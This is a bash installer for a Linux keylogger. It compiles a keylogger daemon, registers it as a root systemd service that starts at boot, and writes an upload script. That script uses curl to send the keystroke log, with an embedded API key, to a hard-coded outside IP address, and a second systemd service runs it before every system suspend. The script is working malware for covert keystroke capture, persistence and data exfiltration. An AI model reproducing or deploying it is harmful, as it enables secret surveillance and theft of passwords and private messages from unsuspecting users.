#!/bin/bash

SRC_FILE="keylogger_daemon.c"
BIN_PATH="/usr/local/bin/keylogger_daemon"
SERVICE_FILE="/etc/systemd/system/keylogger.service"
UPLOAD_SCRIPT="/usr/local/bin/upload_teclado_log.sh"
UPLOAD_SERVICE="/etc/systemd/system/teclado-upload.service"
UPLOAD_TARGET="/etc/systemd/system/suspend.target.wants/teclado-upload.service"

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi

if [[ ! -f "$SRC_FILE" ]]; then
    echo "Source file '$SRC_FILE' not found."
    exit 1
fi

echo "🔧 Compiling $SRC_FILE..."
gcc "$SRC_FILE" -o "$BIN_PATH" || { echo "Compilation failed."; exit 1; }
chmod +x "$BIN_PATH"

echo "Creating systemd service file..."
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Keylogger Daemon
After=network.target
Before=multi-user.target

[Service]
Type=forking
ExecStart=$BIN_PATH
Restart=on-failure
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

echo "🔄 Reloading systemd and enabling keylogger..."
systemctl daemon-reexec
systemctl enable keylogger.service
systemctl start keylogger.service
systemctl status keylogger.service --no-pager

echo "🚀 Creating upload script..."
cat > "$UPLOAD_SCRIPT" <<'EOF'
#!/bin/bash

LOG_FILE="/var/log/teclado.log"
API_KEY="4Eo8?PAB*)77f"
ENDPOINT="http://3.86.151.146:5000/upload"

if [ -f "$LOG_FILE" ]; then
    curl -F "file=@$LOG_FILE" -H "X-API-Key: $API_KEY" "$ENDPOINT"
fi
EOF

chmod +x "$UPLOAD_SCRIPT"

echo "Creating upload service to trigger on suspend..."
cat > "$UPLOAD_SERVICE" <<EOF
[Unit]
Description=Upload teclado.log before system suspend
Before=sleep.target
Requires=sleep.target

[Service]
Type=oneshot
ExecStart=$UPLOAD_SCRIPT
EOF

echo "🔗 Linking upload service to suspend.target..."
mkdir -p "$(dirname $UPLOAD_TARGET)"
ln -sf "$UPLOAD_SERVICE" "$UPLOAD_TARGET"

echo "Reloading systemd and enabling upload service..."
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable teclado-upload.service

echo "✅ Setup complete. Keylogger is running, and upload will trigger before suspend."
